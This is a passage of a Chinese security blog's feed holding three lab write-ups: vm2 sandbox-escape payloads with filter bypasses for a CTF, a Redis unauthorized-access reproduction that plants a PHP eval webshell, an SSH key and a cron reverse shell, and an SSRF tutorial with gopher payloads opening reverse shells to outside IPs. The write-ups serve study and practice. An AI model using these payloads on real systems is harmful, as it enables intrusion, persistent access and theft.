console.log(x);&#125;</code></pre><p>或者</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    try&#123;        Buffer.from(new Proxy(&#123;&#125;, &#123;            getOwnPropertyDescriptor()&#123;                throw f=&gt;f.constructor(&quot;return process&quot;)();            &#125;        &#125;));    &#125;catch(e)&#123;        return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>构造成function传入</p><pre><code class="js">(function() &#123;        &quot;use strict&quot;;    const &#123;VM&#125; = require(&#39;vm2&#39;);    const untrusted = &#39;(&#39; + function()&#123;        TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();        try&#123;            Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;        &#125;catch(e)&#123;            return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();        &#125;    &#125;+&#39;)()&#39;;    try&#123;        console.log(new VM().run(untrusted));    &#125;catch(x)&#123;        console.log(x);    &#125;&#125;)()</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519150121586.png" alt="image-20220519150121586"></p><p>应该关键字被过滤了</p><p>绕过:</p><p>1、在关键字字母上加上 `</p><pre><code class="js">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+/flag`)[`toString`](); &#125; &#125;)()</code></pre><p>2、javascript的模版文字绕过</p><p>prototype变成`${`${`prototyp`}e`}`</p><pre><code class="js">(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;唉，ciscn快开了，ctf太卷了，做做以前题练一下手吧&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;CISCN2021-Quals-upload&quot;&gt;&lt;a href=&quot;#CISCN2021-Quals-upload&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问漏洞复现</title>
    <link href="https://sakurahack-y.github.io/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-26T14:57:50.000Z</published>
    <updated>2022-04-30T16:56:39.911Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h1><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和  hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove  及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached  一样，为了保证效率，数据都是缓存在内存中。区别的是 redis  会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis  的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis  服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。目前比较主流的案例：yam2 minerd  挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马。</p><h1 id="漏洞产生条件"><a href="#漏洞产生条件" class="headerlink" title="漏洞产生条件"></a>漏洞产生条件</h1><p>1、redis服务绑定在0.0.0.0:6379端口，而且信任了其他IP，导致了Redis服务暴露在公网上</p><p>2、没有设置密码认证，可以免密登陆Redis服务</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>1、导致敏感信息泄露，恶意执行flushall清空所有数据</p><p>2、通过Eval执行Lua代码，通过备份功能往磁盘写入后门文件</p><p>3、如果Redis服务以root身份运行，可以给root用户写入SSH公钥文件，直接通过SSH登陆服务器</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶机: centos7.5 阿里云 39.105.x.x    建议用centos</p><p>攻击机: kali2022 </p><p>redis 3.2.11</p><p>1.下载安装redis</p><pre><code>wget http://download.redis.io/releases/redis-3.2.11.tar.gz</code></pre><p>2.解压压缩包</p><pre><code>tar zxvf redis-3.2.11.tar.gz</code></pre><p>3.进入解压目录redis-3.2.11 执行make命令</p><pre><code>cd redis-3.2.11make</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426232909091.png" alt="image-20220426232909091"></p><p>4.进入src目录</p><pre><code>cd src</code></pre><p>5.将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</p><pre><code>cp redis-server /usr/bin/cp redis-cli /usr/bin/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426233508159.png" alt="image-20220426233508159"></p><p>6.返回目录redis-3.2.11,将redis.conf拷贝到/etc/目录下</p><pre><code>cd ..cp redis.conf /etc/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234155118.png" alt="image-20220426234155118"></p><p>7.使用/etc/目录下的redis.conf文件中的配置启动redis服务</p><pre><code>redis-server /etc/redis.conf</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234331895.png" alt="image-20220426234331895"></p><p>8.编辑etc中的redis配置文件redis.conf</p><pre><code>vim /etc/redis.conf</code></pre><p>去掉ip绑定，允许除本地外的主机远程登录redis服务 前面加#注释掉</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430165832466.png" alt="image-20220430165832466"></p><p>关闭保护模式，允许远程连接redis服务将yes 改为no</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426235216372.png" alt="image-20220426235216372"></p><p>最后重启下redis服务就ok</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先测试下目标靶机是否存在未授权访问</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430174535586.png" alt="image-20220430174535586"></p><p>成功连接上了，下面开始进一步利用</p><h2 id="1-写入webshell"><a href="#1-写入webshell" class="headerlink" title="1.写入webshell"></a><strong>1.写入webshell</strong></h2><p>写入一句话木马需要我们知道网站的根目录相对于服务器的绝对路径</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180627722.png" alt="image-20220430180627722"></p><pre><code>config set dir /www/wwwroot/39.105.71.63/config set dbfilename sakura.phpset webshell &quot;&lt;?php @eval($_POST[&#39;pass&#39;]) ?&gt;&quot;save</code></pre><p>我的网站上成功出现了这个文件</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180643451.png" alt="image-20220430180643451"></p><p>测试一下，可以成功连接</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430181012266.png" alt="image-20220430181012266"></p><h2 id="2-通过写入ssh公钥实现ssh登录"><a href="#2-通过写入ssh公钥实现ssh登录" class="headerlink" title="2.通过写入ssh公钥实现ssh登录"></a><strong>2.通过写入ssh公钥实现ssh登录</strong></h2><p>到这一步，我使用的阿里云服务器出了问题，就自己搭建个靶机(centos 7)吧.</p><p>记得关闭防火墙:</p><pre><code>sudo systemctl stop firewalld</code></pre><p>原理:在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key.</p><p>扩展:</p><p><strong>ssh免密登录流程:</strong></p><p>　　（1） 首先在客户端生成一对密钥（ssh-keygen）；</p><p>　　（2） 并将客户端的公钥ssh-copy-id 拷贝到服务端；</p><p>　　（3） 当客户端再次发送一个连接请求，包括ip、用户名；</p><p>　　（4） 服务端得到客户端的请求后，会到authorized_keys中查找，如果有响应的IP和用户，就会随机生成一个字符串，例如：qwer；</p><p>　　（5） 服务端将使用客户端拷贝过来的公钥进行加密，然后发送给客户端；</p><p>　　（6） 得到服务端发来的消息后，客户端会使用私钥进行解密，然后将解密后的字符串发送给服务端；</p><p>　　（7） 服务端接受到客户端发来的字符串后，跟之前的字符串进行对比，如果一致，就允许免密码登录。</p><p><strong>攻击流程:</strong></p><p><strong>1、首先在攻击机(kali)上生成ssh公钥</strong></p><pre><code>ssh-keygen -t rsa</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430191709018.png" alt="image-20220430191709018"></p><p><strong>2.将公钥写入key.txt文件（前后用\n换行，避免和redis里其他缓存数据混合）</strong></p><p> 进入.ssh目录：</p><pre><code>cd /root/.ssh</code></pre><p>写入文件：</p><pre><code>(echo -e”\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430192233869.png" alt="image-20220430192233869"></p><p><strong>3.将key.txt写靶机（使用redis-cli -h ip命令连接靶机，写入文件）</strong></p><pre><code>cat key.txt|redis-cli -h 192.168.0.106 -x set crack</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221009845.png" alt="image-20220430221009845"></p><p>4.远程登录靶机的Redis服务</p><pre><code>redis-cli -h 192.168.0.106</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221026832.png" alt="image-20220430221026832"></p><p>5.更改redis备份路径为ssh公钥存放目录(一般默认为/root/.ssh)</p><pre><code>config set dir /root/.ssh</code></pre><p>6.设置上传公钥的备份文件名字为authorized_keys</p><pre><code>config set dbfilename authorized_keysconfig get dbfilename</code></pre><p>7.保存</p><pre><code>save</code></pre><p>8.在攻击机上直接ssh免密登录靶机,免密登录成功</p><pre><code>ssh -i id_rsa root@192.168.0.106</code></pre><p>最后我没有成功，但大致思路是这样，一直不成功我就先不纠结了。</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1576831989_5dfc8bf50878a.png!small" alt="img"></p><h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a><strong>3.反弹shell</strong></h2><pre><code>redis-cli -h 192.168.0.106set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.108/4444 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220501003825941.png" alt="image-20220501003825941"></p><p>成功反弹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;redis介绍&quot;&gt;&lt;a href=&quot;#redis介绍&quot; class=&quot;headerlink&quot; title=&quot;redis介绍&quot;&gt;&lt;/a&gt;redis介绍&lt;/h1&gt;&lt;p&gt;Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="redis" scheme="https://sakurahack-y.github.io/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞总结</title>
    <link href="https://sakurahack-y.github.io/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-04-24T09:58:17.000Z</published>
    <updated>2022-05-02T14:16:07.407Z</updated>
    
    <content type="html"><![CDATA[<p>最近碰到了挺多SSRF题目的应用，以前学的太浅了，重新学习下，打好基础。</p><p>[TOC]</p><h1 id="SSRF漏洞简介"><a href="#SSRF漏洞简介" class="headerlink" title="SSRF漏洞简介"></a>SSRF漏洞简介</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。<br> 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）<br> <img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095630-ae7ee364-6d72-1.png" alt="img"></p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p> SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。<br> 如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用<code>存在缺陷的web应用作为代理</code>攻击远程和本地的服务器。</p><h2 id="漏洞易发生点"><a href="#漏洞易发生点" class="headerlink" title="漏洞易发生点"></a>漏洞易发生点</h2><ol><li>转码服务</li><li>在线翻译</li><li>图片加载与下载(通过URL地址加载或下载图片)</li><li>图片、文章收藏功能</li><li>网站采集、网页抓取的地方。</li><li>头像的地方。(远程加载头像)</li><li>一切要你输入网址的地方和可以输入ip的地方。</li><li>从URL关键字中寻找：<code>share</code>、<code>wap</code>、<code>url</code>、<code>link</code>、<code>src</code>、<code>source</code>、<code>target</code>、<code>u</code>、<code>3g</code>、<code>display</code>、<code>sourceURl</code>、<code>imageURL</code>、<code>domain</code><br> …</li></ol><h2 id="可以实现的攻击"><a href="#可以实现的攻击" class="headerlink" title="可以实现的攻击"></a>可以实现的攻击</h2><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href="https://www.cnblogs.com/yuanshu/p/11588341.html">banner 信息</a></li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li><li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li><li>进行跳板</li><li>无视cdn</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ol><h1 id="SSRF漏洞相关的函数和协议"><a href="#SSRF漏洞相关的函数和协议" class="headerlink" title="SSRF漏洞相关的函数和协议"></a>SSRF漏洞相关的函数和协议</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p><p>（1）file_get_contents()</p><pre><code class="php">&lt;?php$url = $_GET[&#39;url&#39;];;echo file_get_contents($url);?&gt;</code></pre><blockquote><p><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p></blockquote><p>（2）fsockopen()</p><pre><code>&lt;?php function GetFile($host,$port,$link) &#123;     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);       if (!$fp) &#123;         echo &quot;$errstr (error number $errno) \n&quot;;     &#125; else &#123;         $out = &quot;GET $link HTTP/1.1\r\n&quot;;         $out .= &quot;Host: $host\r\n&quot;;         $out .= &quot;Connection: Close\r\n\r\n&quot;;         $out .= &quot;\r\n&quot;;         fwrite($fp, $out);         $contents=&#39;&#39;;         while (!feof($fp)) &#123;             $contents.= fgets($fp, 1024);         &#125;         fclose($fp);         return $contents;     &#125; &#125;?&gt;</code></pre><blockquote><p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p></blockquote><p>（3）curl_exec()</p><pre><code>&lt;?php if (isset($_POST[&#39;url&#39;]))&#123;    $link = $_POST[&#39;url&#39;];    $curlobj = curl_init();// 创建新的 cURL 资源    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源    $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;    file_put_contents($filename, $result);     echo $result;&#125;?&gt;</code></pre><blockquote><p><code>curl_exec</code>函数用于执行指定的cURL会话</p></blockquote><p><strong>注意</strong></p><pre><code>1.一般情况下PHP不会开启fopen的gopher wrapper2.file_get_contents的gopher协议不能URL编码3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用5.curl_exec() //默认不跟踪跳转，6.file_get_contents() // file_get_contents支持php://input协议</code></pre><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p> （1）<code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容<br> （2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br> （3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br> （4）<code>http/s</code>：探测内网主机存活</p><h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机:kali、远程vps</p><p>目标机:阿里云</p><p>docker镜像：ssrf_redis</p><p>PHP版本：PHP Version 7.2.28(5.6版本测试会失败)</p><p>这里我直接使用宝塔来搭建靶机，注意，需要关闭open_basedir，否则会导致file协议失效</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424204936132.png" alt="image-20220424204936132"></p><h2 id="远程利用示例代码"><a href="#远程利用示例代码" class="headerlink" title="远程利用示例代码"></a>远程利用示例代码</h2><p>ssrf.php</p><pre><code class="php">&lt;?php$ch = curl_init(); //创建新的 cURL 资源curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); //设置URL 和相应的选项#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); //抓取 URL 内容并把它传递给浏览器，存储进文件curl_close($ch); ////关闭 cURL 资源，并且释放系统资源?&gt;</code></pre><p>post.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;    &lt;title&gt;post&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php    echo $_REQUEST[cmd];    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="远程利用方式"><a href="#远程利用方式" class="headerlink" title="远程利用方式"></a>远程利用方式</h2><p><strong>1.利用file协议读取</strong></p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///etc/passwd</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424210730715.png" alt="image-20220424210730715"></p><p>一般探测内网会读一下:</p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///proc/net/arp</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211134080.png" alt="image-20220424211134080"></p><p><strong>2.利用dict协议</strong></p><p>（1）查看端口及端口上运行服务的版本信息</p><pre><code>http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424211349497.png" alt="image-20220424211349497"></p><p>（2）通过dict协议getshell</p><p>有关dict协议：向服务器的端口请求 命令:参数，并在末尾自动补上<code>\r\n</code>(CRLF)<br>                          dict协议要一条一条的执行，而gopher协议执行一条命令就行了</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095631-af0958b4-6d72-1.jpg" alt="img"></p><p><strong>3.利用gopher协议</strong></p><p>  (1)攻击内网redis并反弹shell</p><p>利用redis未授权访问攻击redis<br> <code>攻击redis的exp</code></p><p>shell.sh</p><pre><code>echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/108.166.201.16/4444 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><p>使用这个exp随意一个目标，捕获到数据</p><pre><code>bash shell.sh 39.x.x.x 6379</code></pre><p>再对数据进行一些转换</p><p> 转换规则：<br> 如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。<br> 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。<br> 将<code>\r</code>字符串替换成<code>%0d%0a</code><br> 空白行替换为<code>%0a</code></p><p>结合gopher协议攻击内网redis，使用上边捕获数据的转换结果即可，然后进行反弹shell：</p><pre><code>curl -v &#39;http://39.105.71.63:66/ssrf.php?url=gopher://127.0.0.1:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f108.166.201.16%2f4444%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af32d162-6d72-1.jpg" alt="img"></p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af5bb41a-6d72-1.jpg" alt="img"></p><p>诶，搞这个redis老是把我服务器搞崩，我就不复现了。</p><p>（2）伪造post请求反弹shell</p><pre><code>curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#39;</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-af8614a8-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af8614a8-6d72-1.jpg" alt="img"></a><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-afabc5e0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-afabc5e0-6d72-1.jpg" alt="img"></a><br> 反弹成功<br> <code>192.168.1.5</code>是内网Web服务，有post.php</p><p><strong>4 .利用<code>http/s</code>协议</strong><br> 探测内网主机存活</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-aff15a38-6d72-1.jpg" alt="img"></p><p>说明内网ip为<code>192.168.1.3</code>的主机存活</p><h1 id="SSRF应用攻击实战"><a href="#SSRF应用攻击实战" class="headerlink" title="SSRF应用攻击实战"></a>SSRF应用攻击实战</h1><h2 id="1、gopher攻击redis"><a href="#1、gopher攻击redis" class="headerlink" title="1、gopher攻击redis"></a><strong>1、gopher攻击redis</strong></h2><p>参考<strong>远程利用 3.利用<code>gopher</code>协议</strong></p><h2 id="2、weblogic-ssrf攻击redis"><a href="#2、weblogic-ssrf攻击redis" class="headerlink" title="2、weblogic ssrf攻击redis"></a><strong>2、weblogic ssrf攻击redis</strong></h2><p>下载地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br> 编译并启动环境</p><pre><code>docker-compose builddocker-compose up 